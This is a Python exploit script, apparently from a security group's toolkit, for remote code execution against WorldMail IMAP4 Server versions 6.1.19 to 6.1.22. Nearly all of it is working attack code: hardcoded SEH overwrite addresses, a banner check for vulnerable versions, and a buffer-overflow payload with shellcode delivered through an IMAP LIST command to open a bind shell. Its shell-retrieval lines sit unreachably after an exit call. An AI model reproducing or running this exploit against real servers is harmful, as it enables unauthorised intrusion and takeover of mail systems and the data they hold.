#!/usr/bin/env python
"""
    nullsploit :: Remote Code Executon for WorldMail3.0 IMAP Server

    AUTHOR :: TheXero
    WEBSITE :: www.nullsecurity.net

"""
import sys
if "." not in sys.path: 
    sys.path.append(".")
import struct
import shellcode
import exploitutils

TARGETS                         = {
    0 : ['WorldMail IMAP4 Server 6.1.19', struct.pack("<I", 0x10013B4E)],
    1 : ['WorldMail IMAP4 Server 6.1.20', struct.pack("<I", 0x10022187)],
    2 : ['WorldMail IMAP4 Server 6.1.22', struct.pack("<I", 0x10022187)],
    3 : ['Debug', struct.pack("<I",0x42424242)]
    }

def main():
    parser = exploitutils.arguments()
    args = parser.parse_args()

    if args.PORT:
        PORT = int(args.PORT)
    else:
        PORT = int(143)
   
    if args.PAYLOAD:
        PAYLOAD = str(args.PAYLOAD)
    else:
        PAYLOAD = 'win32bind'
 
    if args.targets:
        print " Exploit targets avaiable:"
        print " ========================="
        for i in TARGETS:
            print " " + str(i) + " | " + TARGETS[i][0]
        sys.exit()

    if args.RHOST:
        HOST = str(args.RHOST)
    else:
        parser.print_help()
        sys.exit()

    if args.check:
        checkVulnerability( HOST, PORT )
        sys.exit()
    
    if args.TARGET:
        TARGET = TARGETS[int(args.TARGET)][1]
    else:
        print " [!] Automatic target selection"
        TARGET = checkVulnerability( HOST, PORT )

    if args.force:
        if not args.TARGET:
            print " [!] Set a target before launching exploit"
            sys.exit()
        run( HOST, PORT, TARGET, PAYLOAD )
        sys.exit()
   
    run( HOST, PORT, TARGET, PAYLOAD )

def checkVulnerability(HOST, PORT):
    # Check banner
    response = exploitutils.bannerchecktest(HOST, PORT)
    
    for i in TARGETS:
        if TARGETS[i][0] in response:
            print " Received %s" % response
            print " [+] Target appears exploitable"
            return TARGETS[i][1]

    print " [-] Target is not vulnerable"
    sys.exit()

def makeSploit( TARGET, PAYLOAD ):
    """
    Construct the attack
    """
    OFFSET=768
    BADCHARS='\x00\x0a\x0d'
    stack= "\x90"*12
    stack+= shellcode.generateshellcode( PAYLOAD, BADCHARS )
    stack+= exploitutils.randomstring( OFFSET - len(stack))
    stack+= "\xeb\x06\x90\x90" # Next SEH
    stack+= TARGET # SEH
    stack+=("\xdb\xc5\xbd\xfc\x37\x63\x33\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x03"
    "\x31\x6f\x17\x83\xc7\x04\x03\x93\x24\x81\xc6\xea\x8f\x81\x2c\xec"
    "\x0f\xf5\xcb")

    SPLOITSTRING = "a0001 LIST }" + stack + "}\r\n"
    return SPLOITSTRING

def run( HOST, PORT, TARGET, PAYLOAD ):
   
    try:
        import time
        SPLOITSTRING = makeSploit( TARGET, PAYLOAD )
        SUCCESS = exploitutils.tcpexploit( HOST, PORT, SPLOITSTRING )
        if SUCCESS != True:
            print " [-] Exploit failed!"
            sys.exit()
            print " Waiting for exploit to finish"
            time.sleep(5)
            print " [+] Retreiving our shell\n"
            exploitutils.handler( HOST, PAYLOAD )
    except Exception as error:
        print error


main()
